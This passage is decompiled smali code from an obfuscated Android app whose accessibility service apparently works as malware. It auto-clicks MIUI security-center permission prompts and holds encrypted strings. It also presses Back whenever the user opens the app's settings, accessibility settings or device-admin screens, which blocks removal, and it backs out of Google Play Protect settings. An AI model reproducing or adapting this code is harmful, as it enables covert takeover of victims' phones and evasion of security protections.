    invoke-virtual {v0, v5, v7, v8}, Landroid/app/AppOpsManager;->checkOp(Ljava/lang/String;ILjava/lang/String;)I

    move-result v0
    :try_end_17
    .catch Ljava/lang/Exception; {:try_start_17 .. :try_end_17} :catch_d
    .catchall {:try_start_17 .. :try_end_17} :catchall_0

    if-nez v0, :cond_28

    goto :goto_18

    :catch_d
    :cond_26
    :try_start_18
    invoke-virtual {v3, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    if-eqz v0, :cond_27

    check-cast v0, Landroid/view/WindowManager;

    new-instance v4, Landroid/view/View;

    invoke-direct {v4, v3}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    new-instance v3, Landroid/view/WindowManager$LayoutParams;

    const/4 v6, 0x0

    const/4 v7, 0x0

    const/16 v8, 0x7f6

    const/16 v9, 0x18

    const/4 v10, -0x2

    move-object v5, v3

    invoke-direct/range {v5 .. v10}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    invoke-virtual {v4, v3}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    invoke-interface {v0, v4, v3}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    invoke-interface {v0, v4}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    :goto_18
    const/4 v0, 0x1

    goto :goto_19

    :cond_27
    new-instance v0, Ljava/lang/NullPointerException;

    invoke-direct {v0, v4}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    throw v0
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_e
    .catchall {:try_start_18 .. :try_end_18} :catchall_0

    :catch_e
    :cond_28
    const/4 v0, 0x0

    :goto_19
    if-eqz v0, :cond_2a

    .line 22
    :try_start_19
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    const-string v3, "autoClickPerm"

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    const/4 v0, 0x0

    :cond_29
    const/4 v2, 0x1

    add-int/2addr v0, v2

    .line 23
    invoke-virtual {v1, v2}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const/4 v2, 0x5

    if-le v0, v2, :cond_29

    invoke-static/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo$a;->a(Landroid/content/Context;)V

    :cond_2a
    const/4 v0, 0x1

    return v0

    .line 24
    :cond_2b
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v3, "autoClickPerm2"

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_2c

    goto :goto_1a

    :cond_2c
    move-object v2, v0

    .line 25
    :goto_1a
    const-string v0, "1"

    invoke-static {v2, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2d

    invoke-virtual/range {p0 .. p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->c()Z
    :try_end_19
    .catchall {:try_start_19 .. :try_end_19} :catchall_0

    const/4 v0, 0x1

    return v0

    :catchall_0
    move-exception v0

    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_2d
    const/4 v0, 0x0

    return v0
.end method

.method public final c()Z
    .locals 6

    const-string v0, "applicationContext"

    const/4 v1, 0x0

    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_0

    const/4 v2, 0x0

    goto :goto_0

    :cond_0
    const-string v3, "com.miui.securitycenter:id/action"

    invoke-virtual {v2, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    :goto_0
    if-nez v2, :cond_1

    move v3, v1

    goto :goto_1

    :cond_1
    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v3

    :goto_1
    iput v3, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o:I

    if-nez v2, :cond_2

    goto :goto_2

    :cond_2
    invoke-static {v2}, Lk0/f;->L(Ljava/util/List;)V

    :goto_2
    const/4 v3, 0x1

    if-nez v2, :cond_3

    goto :goto_3

    :cond_3
    iget v4, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->p:I

    iget v5, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->o:I

    rem-int/2addr v4, v5

    invoke-static {v2, v4}, Lk0/f;->J(Ljava/util/List;I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_4

    goto :goto_3

    .line 1
    :cond_4
    iget v4, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->p:I

    add-int/2addr v4, v3

    .line 2
    iput v4, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->p:I

    .line 3
    invoke-virtual {p0, v2, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_5

    goto :goto_3

    :cond_5
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :goto_3
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_6

    goto :goto_4

    :cond_6
    const-string v4, "com.miui.securitycenter:id/select_allow"

    invoke-virtual {v2, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_7

    :goto_4
    move v4, v1

    goto :goto_6

    :cond_7
    invoke-interface {v2}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    move-result-object v2

    move v4, v1

    :goto_5
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_8

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/view/accessibility/AccessibilityNodeInfo;

    const-string v5, "it"

    invoke-static {v4, v5}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {p0, v4, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    move v4, v3

    goto :goto_5

    :cond_8
    :goto_6
    if-nez v4, :cond_c

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v2

    if-nez v2, :cond_9

    goto :goto_7

    :cond_9
    const-string v4, "android:id/text1"

    invoke-virtual {v2, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    if-nez v2, :cond_a

    goto :goto_7

    :cond_a
    invoke-static {v2}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v2, :cond_b

    goto :goto_7

    :cond_b
    invoke-virtual {p0, v2, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r(Landroid/view/accessibility/AccessibilityNodeInfo;Z)Z

    :cond_c
    :goto_7
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2, v0}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v2}, Lb0/a;->k(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_d

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2, v0}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-static {v2}, Lb0/a;->c(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_d

    const-string v0, ""

    .line 4
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v4, "autoClickPerm2"

    invoke-interface {v2, v4, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 5
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    invoke-static {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo$a;->a(Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return v3

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->getLocalizedMessage()Ljava/lang/String;

    .line 6
    sget-object v0, Lb0/b;->a:Lb0/b;

    :cond_d
    return v1
.end method

.method public final d()Z
    .locals 3

    const-string v0, "device_policy"

    .line 1
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    const-string v1, "null cannot be cast to non-null type android.app.admin.DevicePolicyManager"

    invoke-static {v0, v1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/cisojemopatude/yazi/cuzeteyore/fibaga;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, ""

    .line 2
    sget-object v1, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v1}, Ls0/c;->g(Ljava/lang/Object;)V

    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v1

    const-string v2, "autoClickAdmin"

    invoke-interface {v1, v2, v0}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v1}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 3
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g()V

    const/4 v0, 0x1

    return v0

    :cond_0
    const/4 v0, 0x0

    return v0
.end method

.method public final e()Z
    .locals 3

    :try_start_0
    sget-boolean v0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->r:Z

    if-eqz v0, :cond_1

    .line 1
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v1, "autoClickAdmin"

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    goto :goto_0

    :cond_0
    move-object v2, v0

    .line 2
    :goto_0
    const-string v0, "1"

    invoke-static {v2, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    sget-object v0, Lb0/b;->a:Lb0/b;

    .line 3
    sget-object v0, Lb0/b;->T0:[Ljava/lang/String;

    .line 4
    iget-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    invoke-static {v0, v1}, Lk0/b;->H([Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    const-string v0, "ACC::onAccessibilityEvent: actionBack blockApp "

    iget-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g:Ljava/lang/String;

    invoke-static {v0, v1}, Ls0/c;->z(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;

    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->a()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const/4 v0, 0x1

    return v0

    :catchall_0
    move-exception v0

    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_1
    const/4 v0, 0x0

    return v0
.end method

.method public final f()V
    .locals 2

    const/4 v0, 0x0

    :cond_0
    const/4 v1, 0x1

    add-int/2addr v0, v1

    invoke-virtual {p0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    const/4 v1, 0x3

    if-le v0, v1, :cond_0

    const/4 v0, 0x2

    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    return-void
.end method

.method public final g()V
    .locals 2

    const/4 v0, 0x0

    :cond_0
    const/4 v1, 0x1

    add-int/2addr v0, v1

    invoke-virtual {p0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    if-le v0, v1, :cond_0

    return-void
.end method

.method public final h(Ljava/lang/String;)Z
    .locals 10

    const/4 v0, 0x0

    :try_start_0
    invoke-static {}, Ls0/c;->o()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, p1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_7

    const-string v1, "com.android.settings"

    const/4 v2, 0x2

    invoke-static {p1, v1, v0, v2}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v1

    const/4 v3, 0x1

    if-eqz v1, :cond_1

    iget-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->d:Ljava/lang/String;

    const-string v4, "com.android.settings.applications.installedappdetailstop"

    invoke-static {v1, v4, v0, v2}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v1

    if-nez v1, :cond_0

    iget-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->d:Ljava/lang/String;

    const-string v4, "com.android.settings.settings.accessibilitysettingsactivity"

    invoke-static {v1, v4, v0, v2}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v1

    if-eqz v1, :cond_1

    :cond_0
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    return v3

    :cond_1
    const-string v1, "com.google.android.packageinstaller"

    invoke-static {p1, v1, v0, v2}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    const/16 v4, 0x80

    const-string v5, ""

    const-string v6, "dWpQMzRQMUJNZ0FBYUdibWdSMkdqUT09OjpEekZPejMvNUlKTHpIdzRFZk1mM2FnPT0="

    const-string v7, "eUVDanJhYnF4N0NmN2pBM2NyWnpxZ0FDY2cxSFRWTk5iV1VFeDJGUFJuUT06Olh6Q3ZMR2N3aGVpZXlJVWhVNXZURlE9PQ=="

    if-eqz v1, :cond_3

    :try_start_1
    iget-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->d:Ljava/lang/String;

    const-string v8, "android.app.alertdialog"

    invoke-static {v1, v8, v0, v2}, Ly0/h;->R(Ljava/lang/CharSequence;Ljava/lang/CharSequence;ZI)Z

    move-result v1

    if-eqz v1, :cond_3

    iget-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->h:Ljava/lang/String;

    invoke-static {}, Ls0/c;->k()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2, v3}, Ly0/h;->Q(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    move-result v1

    if-nez v1, :cond_2

    iget-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->h:Ljava/lang/String;
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 1
    :try_start_2
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v8

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v8, v9, v4}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v8

    invoke-virtual {v2, v8}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v2

    check-cast v2, Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    goto :goto_0

    :catch_0
    :try_start_3
    invoke-static {v7}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    invoke-static {v6}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 2
    sget-object v2, Lb0/b;->a:Lb0/b;

    move-object v2, v5

    .line 3
    :goto_0
    invoke-static {v1, v2, v3}, Ly0/h;->Q(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    move-result v1

    if-eqz v1, :cond_3

    :cond_2
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    return v3

    :cond_3
    iget-object v1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->d:Ljava/lang/String;

    const-string v2, "android.widget.linearlayout"

    invoke-static {v1, v2}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_6

    const-string v1, "com.android.settings"

    invoke-static {p1, v1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_4

    const-string v1, "com.miui.securitycenter"

    invoke-static {p1, v1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_6

    :cond_4
    iget-object p1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->h:Ljava/lang/String;

    invoke-static {}, Ls0/c;->k()Ljava/lang/String;

    move-result-object v1

    invoke-static {p1, v1, v3}, Ly0/h;->Q(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    move-result p1

    if-nez p1, :cond_5

    iget-object p1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->h:Ljava/lang/String;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 4
    :try_start_4
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v2, v8, v4}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object v2

    invoke-virtual {v1, v2}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object v1

    check-cast v1, Ljava/lang/String;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    move-object v5, v1

    goto :goto_1

    :catch_1
    :try_start_5
    invoke-static {v7}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    invoke-static {v6}, Lf0/a;->c(Ljava/lang/String;)Ljava/lang/String;

    .line 5
    sget-object v1, Lb0/b;->a:Lb0/b;

    .line 6
    :goto_1
    invoke-static {p1, v5, v3}, Ly0/h;->Q(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    move-result p1

    if-eqz p1, :cond_6

    :cond_5
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V

    return v3

    :cond_6
    iget-object p1, p0, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->d:Ljava/lang/String;

    const-string v1, "com.android.settings.deviceadminadd"

    invoke-static {p1, v1}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_7

    const-string p1, "device_policy"

    .line 7
    invoke-virtual {p0, p1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    const-string v1, "null cannot be cast to non-null type android.app.admin.DevicePolicyManager"

    invoke-static {p1, v1}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;

    check-cast p1, Landroid/app/admin/DevicePolicyManager;

    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/cisojemopatude/yazi/cuzeteyore/fibaga;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v1}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result p1

    if-eqz p1, :cond_7

    .line 8
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->f()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    return v3

    :catchall_0
    move-exception p1

    invoke-static {p1}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_7
    return v0
.end method

.method public final i()V
    .locals 3

    .line 1
    :try_start_0
    sget-object v0, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v0}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v1, "checkProtect"

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    goto :goto_0

    :cond_0
    move-object v2, v0

    .line 2
    :goto_0
    const-string v0, "1"

    invoke-static {v2, v0}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_1

    goto :goto_1

    :cond_1
    const-string v1, "com.android.vending:id/toolbar_item_play_protect_settings"

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-nez v0, :cond_2

    goto :goto_1

    :cond_2
    invoke-static {v0}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v0, :cond_3

    goto :goto_1

    :cond_3
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g()V

    :goto_1
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_4

    goto :goto_2

    :cond_4
    const-string v1, "com.android.vending:id/play_protect_settings"

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-nez v0, :cond_5

    goto :goto_2

    :cond_5
    invoke-static {v0}, Lk0/f;->I(Ljava/util/List;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-nez v0, :cond_6

    goto :goto_2

    :cond_6
    invoke-virtual {p0}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->g()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_2

    :catchall_0
    move-exception v0

    invoke-static {v0}, Lb/a;->g(Ljava/lang/Throwable;)Ljava/lang/Object;

    :cond_7
    :goto_2
    return-void
.end method

.method public final j(Landroid/view/accessibility/AccessibilityNodeInfo;)Z
    .locals 6

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v0

    const/4 v1, 0x0

    if-nez v0, :cond_2

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const-string v2, "nodeInfo.parent"

    invoke-static {v0, v2}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 1
    invoke-virtual {p0, v0, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    .line 2
    sget-object v0, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v2, 0x4b

    invoke-virtual {v0, v2, v3}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v4

    if-nez v4, :cond_0

    .line 3
    invoke-virtual {p0, p1, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    .line 4
    invoke-virtual {v0, v2, v3}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :cond_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v4

    if-nez v4, :cond_1

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    invoke-virtual {v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    const-string v5, "nodeInfo.parent.parent"

    invoke-static {v4, v5}, Ls0/c;->h(Ljava/lang/Object;Ljava/lang/String;)V

    .line 5
    invoke-virtual {p0, v4, v1}, Lcom/cisojemopatude/yazi/nopofoyuwure/pozetinawo;->n(Landroid/view/accessibility/AccessibilityNodeInfo;Z)V

    .line 6
    invoke-virtual {v0, v2, v3}, Ljava/util/concurrent/TimeUnit;->sleep(J)V

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p1

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->refresh()Z

    :cond_1
    const/4 p1, 0x1

    return p1

    :cond_2
    return v1
.end method

.method public final k()V
    .locals 11

    const-string v0, "MFRsU09McWdsSFBGSksvMWJrWkUrUT09Ojo4ZFU0bzAxbVEzY2tjVnJ1WlAySXBnPT0="

    const-string v1, ""

    .line 1
    :try_start_0
    sget-object v2, Ls0/c;->d:Landroid/content/SharedPreferences;

    invoke-static {v2}, Ls0/c;->g(Ljava/lang/Object;)V

    const-string v3, "autoClickCache"

    invoke-interface {v2, v3, v1}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    if-nez v2, :cond_0

    move-object v2, v1

    .line 2
    :cond_0
    const-string v3, "1"

    invoke-static {v2, v3}, Ls0/c;->e(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_2

    if-eqz v2, :cond_6f

    const/4 v2, 0x0

    const-wide/16 v3, 0x64

